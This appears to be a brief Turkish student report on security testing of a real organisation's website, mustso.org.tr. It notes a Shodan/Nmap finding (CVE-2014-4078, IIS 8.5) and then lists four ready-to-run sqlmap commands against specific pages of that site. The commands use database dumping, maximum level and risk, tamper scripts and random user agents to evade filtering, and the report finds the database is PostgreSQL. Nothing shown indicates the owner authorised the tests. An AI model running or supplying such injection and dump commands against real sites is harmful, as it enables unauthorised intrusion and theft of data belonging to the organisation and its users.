# Bilgi Sistemleri ve Güvenliği

Testler Sqlmap, Nikto, Nmap üzerinden yapılmıştır.

# Nmap

https://www.shodan.io/
sitesinde yapılan taramada orta seviyeli olarak CVE-2014-4078 sonucu elde edildi ve ISS 8.5 kullanıyor kullanıldığı tespit edildi.

# Sqlmap

Sqlmapte yapılan testler sonucunda veritabanı olarak PostgreSQL kullanıldığı tespit edildi. Bunun yanı sıra yapılan testler sonucunda belirli çıktılar elde edildi.


Bu test aşamasında yazılan kodlar:

1-) python sqlmap.py -u "https://www.mustso.org.tr/Bas%C4%B1ndaBiz/Haber/tabid/17222/articleType/ArticleView/articleId/41518/Hayirli-Ramazanlar.aspx" --data="*"  --tamper="space2comment" --dbs --dump --batch

2-) python sqlmap.py -u "https://www.mustso.org.tr/Bas%C4%B1ndaBiz/Haber/tabid/17222/articleType/ArticleView/articleId/41518/Hayirli-Ramazanlar.aspx" --data="*"  --tamper="space2comment" --dbs --level 5 --risk 3 --dump --batch

3-)python sqlmap.py -u "https://www.mustso.org.tr/Default.aspx" --dbs --forms --crawl=2 --tamper=space2comment --random-agent
Bu işlemde veritabanının PostgreSQL olduğu tespit edilmiştir!


4-) python sqlmap.py -u "https://www.mustso.org.tr/Default.aspx" --dbs --forms --crawl=2 --dbms=postgresql --tamper=space2comment --random-agent --time-sec=10 --level=5 --risk=3
